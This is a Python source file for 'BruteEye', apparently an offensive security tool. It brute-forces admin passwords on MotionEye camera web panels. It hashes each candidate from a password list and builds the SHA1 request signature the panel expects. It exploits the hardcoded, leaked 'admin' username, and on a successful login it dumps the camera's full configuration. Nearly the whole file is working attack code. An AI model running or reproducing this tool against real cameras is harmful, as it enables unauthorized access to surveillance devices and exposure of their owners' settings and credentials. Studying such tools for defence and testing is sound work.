import requests
import argparse
import pyfiglet
import time
import hashlib
from datetime import datetime
from bs4 import BeautifulSoup

banner = pyfiglet.figlet_format("BruteEye ( O )",width = 200)
print(banner+'\nAuthor: Evasive_Ginger/RedHeadSec\n')


parser = argparse.ArgumentParser(description="A tool for brute forcing MotionEye camera web panels.")
parser.add_argument("target", help="Enter the target host. EX: http://192.168.254.149:8765", type=str)
parser.add_argument("password_list", help="Enter the path for the password list.", type=str)
parser.add_argument("-p", "--port", default='8765',help="Port running MotoionEye web console.",type=str)
parser.add_argument("-d","--delay", help="Apply sleep limiting for X seconds/ms. Example: 0.5",default=0,type=float)
args = parser.parse_args()

#Tested with version 0.36.1
username = 'admin' # As of 0.42, the admin user can not be changed via GUI (Can be via config file). May be different for modified environments!
# The username is passed to the client via HTLM to be parsed by client-side JS, so it is leaked for you.
version = '1.0'
ssl = None
pass_file = open(args.password_list,'r')
pass_line = pass_file.readlines()

def logger(func):
	def wrapper():
		print("Version: {}".format(version))
		print("-"*50)
		print("> Execution Started {}".format(datetime.today().strftime("%m-%d-%Y %H:%S")+"\n"))
		func()
		print("\n> Execution Finished {}".format(datetime.today().strftime("%m-%d-%Y %H:%S")))
		print("-"*50)
	return wrapper

def sha1Pass(password):
	sha1 = hashlib.sha1(password.strip().encode())
	return sha1.hexdigest()


def computeSignature(path, passhash,method='GET'):
	builder = method+':'+path+':'+':'+str(passhash)
	signature = hashlib.sha1(builder.encode())
	return signature

def get_epoch():
	return round(time.time())


def sendRequest(target,username,password):
	epoch = get_epoch()
	path = '/login/?_='+str(epoch)+'&_login=true&_username=admin'
	sig = computeSignature(path,sha1Pass(password)).hexdigest()
	url = 'http://'+target+':'+args.port+'/login/?_='+str(epoch)+'&_username=admin&_login=true&_signature='+str(sig)
	req = requests.get(url)

	# Pull config as confirmation if valid
	if req.status_code == 200 and req.text == '{}':
		epoch2 = get_epoch()
		path2 = '/config/main/get/?_='+str(epoch)+'&_username=admin'
		sig2 = computeSignature(path2,sha1Pass(password)).hexdigest()
		config_url = 'http://'+target+':'+args.port+'/config/main/get/?_='+str(epoch2)+'&_username=admin&_signature='+str(sig2)
		print("Success with "+password+"! Dumping Configuration: ")
		config_req = requests.get(config_url)
		print(config_req.text)
		exit()
	else:
		time.sleep(args.delay)
		pass

@logger
def main():
	print("Running BruteEye!")
	for password in pass_line:
		try:
			print("Attempting password: "+password.strip())
			sendRequest(args.target,username,password.strip())

		except KeyboardInterrupt:
			print("\nUser aborted process!")
			exit()
		except Exception as e:
			print(e)

main()
